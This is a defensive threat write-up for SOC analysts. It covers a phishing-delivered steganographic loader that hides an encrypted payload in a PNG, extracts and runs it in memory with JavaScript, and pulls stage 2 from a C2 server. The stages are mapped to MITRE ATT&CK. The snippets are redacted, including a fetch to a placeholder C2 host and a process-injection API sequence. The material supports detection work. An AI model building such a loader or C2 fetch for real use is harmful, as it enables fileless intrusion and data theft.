# Web-Based Stego Loader – Email → Browser → PNG → Memory

**Author:** Ala Dabat  
**Scenario:** Web-delivered steganographic loader using PNG + JavaScript for auto-execution  
**Audience:** L2/L3 SOC Analysts, Incident Responders, Detection Engineers  

This section documents a **web-based stego loader** attack chain where:

- The user **only clicks an email link**.
- The browser **auto-renders an HTML page**.
- **JavaScript + a PNG image** silently perform the staging and memory execution.
- The final payload can be a **RAT, ransomware, or beacon**.

No further user interaction is required after the initial click.

---

## 1. High-Level Attack Summary

1. User receives a **phishing email** with a link.
2. User clicks link → browser opens malicious page.
3. The page includes a **stego PNG** and **JavaScript**.
4. JavaScript:
   - Loads the PNG as bytes.
   - Extracts the hidden encrypted payload.
   - Decrypts it.
   - Executes it in memory or pulls further commands from C2.
5. Final stage:  
   - RAT / backdoor  
   - Ransomware  
   - C2 beacon (e.g. Cobalt Strike-like behaviour)

From the SOC point of view, this appears as:

- Browser process → script engine → network + suspicious memory patterns  
- No obvious “malicious EXE” on disk  
- Activity chained to **email + link click**

---

## 2. Stego-Based Auto-Execution Attack Chain (Tabular View)

### 2.1 Stage-by-Stage Breakdown with MITRE Mapping

| **Stage** | **User Action** | **Auto-Execution / Behaviour** | **PNG / Script Content (Redacted)** | **MITRE ATT&CK Mapping** | **Result / Outcome** |
|----------|------------------|---------------------------------|--------------------------------------|--------------------------|-----------------------|
| **1. Delivery – Email** | User opens phishing email *(1 click)* | Email client renders HTML and may pre-load images or remote content | `<img src="[REDACTED_TRACKING_PNG]" …>`<br>`<a href="[REDACTED_LANDING_URL]">View invoice</a>` | **TA0001 – Initial Access**<br>**T1566.002 – Spearphishing Link** | User is primed to click link to “view invoice/portal/report” |
| **2. Initial Access – Link Click** | User clicks malicious link *(1 click)* | Browser loads attacker’s landing page with embedded PNG and JavaScript | `<img src="invoice.png" style="display:none">`<br>`<script src="loader.js"></script>` | **TA0001 – Initial Access**<br>**T1189 – Drive-by Compromise**<br>**T1204.001 – User Execution: Malicious Link** | Attacker-controlled HTML context is now running in user’s browser |
| **3. Execution – JS + PNG** | **No further clicks** | JavaScript automatically executes and reads PNG as a binary blob via browser APIs | `let imgData = fetch('invoice.png')`<br>`let payload = extractHidden(imgData);` | **TA0002 – Execution**<br>**T1059.007 – JavaScript**<br>**T1027.003 – Steganography / Obfuscated** | Hidden payload is extracted from PNG in memory (still encrypted) |
| **4. Decryption & Loader Creation** | None | JS or a spawned process decrypts the PNG-embedded payload to produce shellcode or a loader | `[ENCRYPTED_SHELLODE_BLOB_REDACTED]`<br>`let decoded = decrypt(payload, key);` | **TA0005 – Defense Evasion**<br>**T1027 – Obfuscated Files or Information** | A fileless loader exists in memory, ready to execute |
| **5. Command Retrieval / Stage-2 Fetch** | None | Loader reaches out to C2 over HTTPS to pull additional instructions or binaries | `fetch('https://[REDACTED_C2]/stage2')`<br>`cmd = decode(response)` | **TA0011 – Command & Control**<br>**T1071.001 – Web Protocols**<br>**T1105 – Ingress Tool Transfer** | Attacker now has remote control for staging and tasking |
| **6. Secondary Payload Execution** | None | Loader injects or runs stage-2 payload in a target process (browser, Office, or new process) using RWX memory and thread creation | `VirtualAlloc` → `WriteProcessMemory` → `CreateThread` (via JS-bridged or native loader) | **TA0002 – Execution**<br>**TA0004 – Privilege Escalation**<br>**T1055 – Process Injection** | Stage-2 (RAT / ransomware / beacon) runs stealthily, often without any new EXE on disk |
| **7. Post-Exploitation** | None | Final malware performs discovery, lateral movement, credential theft, and exfiltration | Examples (descriptive, not exhaustive):<br>- `[RAT_PAYLOAD]` – keystrokes, clipboard, screenshots<br>- `[RANSOMWARE_PAYLOAD]` – file encryption + note drop<br>- `[BEACON_PAYLOAD]` – periodic C2 callbacks | **TA0007 – Discovery**<br>**TA0008 – Lateral Movement**<br>**TA0006 – Credential Access**<br>**TA0010 – Exfiltration**<br>**TA0040 – Impact** | Full compromise: data theft and/or encryption, persistence via registry, services, or DLL sideloading |

---

## 3. Mermaid Diagram – Web Stego Loader Flow

### 3.1 User → Browser → PNG → Memory Execution

~~~mermaid
flowchart TD

A[Phishing Email<br>With Malicious Link] --> B[User Clicks Link<br>1 Click]
B --> C[Browser Loads Landing Page<br>HTML + JS + Hidden PNG]
C --> D[JavaScript Auto-Runs<br>No Extra User Input]
D --> E[JS Reads PNG as Bytes<br>Extracts Hidden Payload]
E --> F[Payload Decrypted in Memory<br>Shellcode/Loader]
F --> G[Loader Contacts C2<br>HTTPS / Web API]
G --> H[Stage-2 Payload Delivered<br>RAT / Ransomware / Beacon]
H --> I[Post-Exploitation<br>Discovery, Lateral Movement, Exfiltration]

~~~
